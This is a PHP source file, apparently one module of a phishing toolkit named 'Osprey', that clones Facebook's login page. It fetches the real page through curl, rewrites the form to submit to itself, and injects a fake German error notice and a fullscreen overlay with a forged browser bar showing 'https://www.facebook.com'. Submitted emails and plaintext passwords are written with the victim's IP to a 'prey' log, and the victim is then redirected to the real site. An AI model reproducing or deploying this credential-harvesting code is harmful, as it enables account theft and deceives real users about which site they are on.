<?php

namespace Osprey\Modules;

class FacebookModule extends Module
{
	private $url;
	
	private static $urlStart = 'https://www.facebook.com/';
	private static $urlLogin = 'https://www.facebook.com/login.php?login_attempt=1';
	
	private $dataSubmitted = false;
	
	private $output;
	
	public function __construct()
	{
		$this->url = self::$urlStart;
		
		$this->dataSubmitted = $this->isDataSubmitted();
		
		if(!$this->dataSubmitted && isset($_REQUEST['lsd'])) {
			$this->url = self::$urlLogin;
		}
		
		$result = $this->loadData();
		
		if($result === false) {
			$this->output = "Error.";
		} else {
			$result = str_replace("</head><body", "<link rel=\"stylesheet\" href=\"assets/modules/Facebook/css/styles.css\" type=\"text/css\" /></head><body", $result);
			$result = str_replace("https://www.facebook.com/login.php?login_attempt=1", "index.php?module=FacebookModule", $result);
			$result = str_replace("/login.php?login_attempt=1", "facebook.php", $result);
			$result = str_replace("onsubmit=\"return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)\"", "", $result);
			$result = str_replace("<meta http-equiv=\"refresh\" content=\"0; URL=/?_fb_noscript=1\" />","",$result);
			$result = str_replace("<meta http-equiv=\"refresh\" content=\"0; URL=/login.php?login_attempt=1&amp;_fb_noscript=1\" />","",$result);	
			if($this->dataSubmitted) {
				// log the prey
				$logMessage = date("d.m.Y|H:i:s");
				$logMessage.= " >> ";
				$logMessage.= $_SERVER['REMOTE_ADDR'];
				$logMessage.= " | email: ";
				$logMessage.= $_REQUEST['email'];
				$logMessage.= " | pw: ";
				$logMessage.= $_REQUEST['pass'];
				$logMessage.= "\r\n";
				error_log($logMessage, 3, "../storage/prey/zgvrgn0_".date("Ymd").".log");
				// redirect to https not necessary
				header('Location: http://www.facebook.com');
			} else {
				$result = str_replace("<div class=\"login_form_container\">", self::errorMessageLogin()."<div class=\"login_form_container\">", $result);
			}
			if(!$this->dataSubmitted && !isset($_REQUEST['lsd'])) {
				$result = str_replace("</body>", self::notificationScript()."</body>", $result);
			}
			$this->output = $result;
		}		
	}

	public function getPrimedOutput()
	{
		return $this->output;
	}
	
	public function setConfiguration($array)
	{
		
	}
	
	private function isDataSubmitted()
	{
		if(isset($_REQUEST['email']) && isset($_REQUEST['pass'])) {	
			if($_REQUEST['email'] != "" && $_REQUEST['pass'] != "") {
				return true;
			}
		}
		return false;
	}
	
	private function loadData()
	{		
		$userAgent = (!empty($_SERVER['HTTP_USER_AGENT'])) ? $_SERVER['HTTP_USER_AGENT'] : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10';
		$curl_log = fopen('../storage/log/curl_'.date("U").'.log', 'w');
		$curl_options = array(
			CURLOPT_URL => $this->url,
			CURLOPT_HEADER => false,
			CURLOPT_USERAGENT => $userAgent,
			CURLOPT_CONNECTTIMEOUT => 180,
			CURLOPT_RETURNTRANSFER => true,
			CURLOPT_SSL_VERIFYPEER => false,
			CURLOPT_FOLLOWLOCATION => true,
			CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_0,
			CURLOPT_VERBOSE => true,
			CURLOPT_STDERR => $curl_log
		);
		
		$curl = curl_init();
		curl_setopt_array($curl, $curl_options);
		
		return curl_exec($curl);
	}
	
	private static function notificationScript()
	{
		return $notificationScript = <<<EOT
<div id="fullScreen" style="z-index:5000;position:absolute;top:0;left:0;width:100%;height:100%;background-color:rgb(255,255,255);">
	<div style="width:800px;padding: 25px 0;margin: 200px auto 0 auto;color:#000;text-align:center;border:1px solid #ddd;border-radius:10px;">
		<div style="height:80px; margin: 50px 0 20px 0;">
			<a href="#" id="startfullscreen" style="margin: 0 0 50px 0;text-decoration: none;font-size: 18pt;color: #fff;background-color: #5b74a8;padding: 30px 50px;border-radius: 10px">App im Vollbildmodus starten</a>
			<span id="logoutMessage" style="display:none;">Du wirst weitergeleitet...</span>
		</div>
		<p><a href="javascript:history.back()" id="back">Zurück</a></p>
	</div>
</div>
<div id="notMes" style="z-index:999;position:absolute;top:0;left:0;width:100%;height:100%;background-color:rgba(0,0,0,0.4);">
	<div style="width:800px;padding: 25px 0;margin: 140px auto;color:#fff;text-align:center;background-color:rgba(0,0,0,0.8);border-radius:10px;">
		<h3 style="color:#eee;">Da hat sich wohl jemand einen Scherz mit dir erlaubt ...</h3>
		<p>
			... und dich mit diesem Link aus Facebook ausgeloggt.<br />
			Aber keine Angst, du kannst dich gleich wieder einloggen!
		</p>
		<div style="margin: 6px 0 -4px 0;">
			<label class="uiButton uiButtonLarge uiButtonConfirm"><input id="okbutt" type="button" name="continue" value="Weiter"></label>
		</div>
	</div>
</div>
<div id="browserBar" style="z-index:4999;position:absolute;top:0;left:0;width:100%;height:36px;background:#000 url('assets/img/chrome_header.png') scroll no-repeat 0 0;display:none;">
	<div style="position:absolute;top:0;right:0;width:9px;height:36px;background:#000 url('assets/img/chrome_header_right.png') scroll no-repeat 0 0;"></div>
	<a href="javascript:history.back()" id="back2" style="position:absolute;display:inline-block;width:28px;height:30px;margin: 3px;"></a>
	<input class="browserinput" type="text" value="https://www.facebook.com" />
</div>
<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js" ></script>
<script type="text/javascript" src="assets/js/jquery.fullscreen-0.4.1.min.js" ></script>
<script type="text/javascript">
	var timer = null;
	function redirect() {		
		clearTimeout(timer);
		$('#fullScreen').fadeOut();
	}
	$(document).ready(function() {
		$('#startfullscreen').click(function(event) {
			if($.fullscreen.isNativelySupported()) {
				$('body').fullscreen();
				$('#startfullscreen').hide();
				$("#logoutMessage").show();
				timer = setTimeout("redirect()", 4000);
			} else {
				alert("Sorry, unsere App funktioniert in deinem Browser nicht.");
			}			
		});
		$('#okbutt').click(function(event) {
			$('#notMes').hide();
			document.getElementById("email").focus();
		});
		$(document).bind('fscreenclose', function() {
			clearTimeout(timer);
			$('body').removeClass('browserbar');
			$('#browserBar').hide();
			$('#startfullscreen').show();
			$("#logoutMessage").hide();
			$('#fullScreen').show();
		});
		$(document).bind('fscreenopen', function() {
			$('body').addClass('browserbar');
			$('#browserBar').show();
		});
	});
</script>
EOT;
	}
	
	private static function errorMessageLogin()
	{
		return $errorLogin = <<<EOT
<div class="pam login_error_box uiBoxRed">
	<div class="fsl fwb fcb">Falsche E-Mail-Adresse</div>
	<div>
		<p>Die eingegebene E-Mail-Adresse gehört zu keinem Konto.</p>
		<p>Du kannst dich unter Verwendung jedes Nutzernamens, jeder E-Mail oder Handynummer, welche/r mit deinem Konto verknüpft ist, für dieses anmelden. Versichere dich, dass dies richtig eingegeben ist.</p>
	</div>
</div>
EOT;
	}
}
